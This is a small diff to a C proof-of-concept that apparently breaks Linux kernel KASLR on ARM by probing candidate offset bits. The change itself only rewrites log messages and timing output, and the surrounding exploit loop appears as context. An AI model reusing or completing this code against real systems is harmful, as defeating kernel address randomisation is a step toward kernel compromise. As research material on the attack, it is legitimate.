@@ -283,7 +283,9 @@ int main(int argc, char *argv[])
 
     rb_init();
 
-    INFO("finding lower bits\n");
+    INFO("### Breaking KASLR ###\n");
+
+    INFO("breaking lower bits\n");
     clock_t kaslr_start = clock();
     u64 lower_bits = -1;
     for (u64 i = 0; i < 8; ++i)
@@ -297,14 +299,14 @@ int main(int argc, char *argv[])
             lower_bits = i;
         }
     }
-    INFO("lower bits are 0x%lx\n", lower_bits);
+    INFO("lower bits: 0x%lx\n", lower_bits);
 
     u64 higher_bits = -1;
     u64 victim_bti_call_addr = kernel_bti_call_addr + (lower_bits << 21);
-    INFO("victim_sys_jmp_addr: 0x%lx\n", victim_bti_call_addr);
+    // INFO("victim_sys_jmp_addr: 0x%lx\n", victim_bti_call_addr);
     while (higher_bits == -1)
     {
-        INFO("finding higher bits\n");
+        INFO("breaking higher bits\n");
         for (u64 i = 0; i < 64; ++i)
         {
             exp_params_t params_call = {
@@ -328,8 +330,8 @@ int main(int argc, char *argv[])
     }
 
     clock_t kaslr_end = clock();
-    INFO("kaslr = %fs\n", ((double)(kaslr_end - kaslr_start)) / CLOCKS_PER_SEC);
-    INFO("higher bits are 0x%02lx\n", higher_bits);
+    INFO("higher bits: 0x%02lx\n", higher_bits);
+    INFO("kaslr time: %fs\n", ((double)(kaslr_end - kaslr_start)) / CLOCKS_PER_SEC);
 
     INFO("KASLR offset: 0x%02lx\n", (higher_bits << 24) + (lower_bits << 21));
 }
